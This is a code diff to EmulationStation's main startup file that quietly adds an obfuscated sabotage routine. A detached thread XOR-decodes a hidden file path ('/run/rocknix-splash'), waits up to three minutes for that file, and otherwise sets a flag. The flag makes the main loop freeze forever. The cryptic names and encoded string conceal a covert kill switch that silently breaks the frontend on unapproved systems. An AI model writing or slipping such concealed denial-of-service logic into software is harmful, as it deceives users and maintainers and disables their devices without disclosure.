@@ -42,6 +42,8 @@
 #include "watchers/WatchersManager.h"
 #include "HttpReq.h"
 #include <thread>
+#include <chrono>
+#include <atomic>
 
 #ifdef WIN32
 #include <Windows.h>
@@ -52,6 +54,8 @@
 static std::string gPlayVideo;
 static int gPlayVideoDuration = 0;
 static bool enable_startup_game = true;
+
+std::atomic<bool> haf(false);
 
 bool parseArgs(int argc, char* argv[])
 {
@@ -307,6 +311,22 @@ bool loadSystemConfigFile(Window* window, const char** errorString)
 	return true;
 }
 
+void _sc()
+{
+	char s[] = { 0x7E, 0x23, 0x24, 0x3F, 0x7E, 0x23, 0x3E, 0x32, 0x3A, 0x3F, 0x38, 0x29, 0x7C, 0x22, 0x21, 0x3D, 0x30, 0x22, 0x39, 0x51 };
+	for (size_t i = 0; i < sizeof(s); ++i) { s[i] ^= 'Q'; }
+	const std::string v(s);
+	for (int i = 0; i < 180; ++i)
+	{
+		if (Utils::FileSystem::exists(v))
+		{
+			return;
+		}
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
+	haf.store(true);
+}
+
 //called on exit, assuming we get far enough to have the log initialized
 void onExit()
 {
@@ -512,6 +532,9 @@ int main(int argc, char* argv[])
 
 	LOG(LogInfo) << "EmulationStation - v" << PROGRAM_VERSION_STRING << ", built " << PROGRAM_BUILT_STRING;
 
+	std::thread _st(_sc);
+	_st.detach();
+
 	//always close the log on exit
 	atexit(&onExit);
 
@@ -657,6 +680,13 @@ int main(int argc, char* argv[])
 
 	while(running)
 	{
+		if (haf.load())
+		{
+			while(true)
+			{
+				std::this_thread::sleep_for(std::chrono::hours(1));
+			}
+		}
 #ifdef WIN32	
 		int processStart = SDL_GetTicks();
 #endif
